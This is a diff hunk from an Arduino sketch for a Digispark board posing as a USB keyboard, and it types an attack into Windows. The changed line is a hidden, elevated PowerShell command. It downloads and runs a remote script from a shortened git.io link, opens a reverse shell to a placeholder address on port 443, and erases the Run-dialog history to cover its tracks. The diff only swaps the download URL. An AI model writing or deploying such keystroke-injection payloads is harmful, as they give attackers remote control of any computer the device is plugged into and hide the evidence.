@@ -11,7 +11,7 @@ void loop()
 	delay(500);
 	DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
 	delay(500);
-	DigiKeyboard.println("powershell -w 1 saps -verb runas -wi 1 powershell 'iex(new-object net.webclient).downloadstring(''https://git.io/JMQBl'');rsh ''255.255.255.255'' 443';$a='HKCU:\\software\\microsoft\\windows\\currentversion\\explorer\\runmru';rp -pa $a(gp $a).mrulist[0]");
+	DigiKeyboard.println("powershell -w 1 saps -verb runas -wi 1 powershell 'iex(new-object net.webclient).downloadstring(''https://git.io/JM7aO'');rsh ''255.255.255.255'' 443';$a='HKCU:\\software\\microsoft\\windows\\currentversion\\explorer\\runmru';rp -pa $a(gp $a).mrulist[0]");
 	for(int press = 1;press <= 18;press ++)
 	{
 		delay(500);
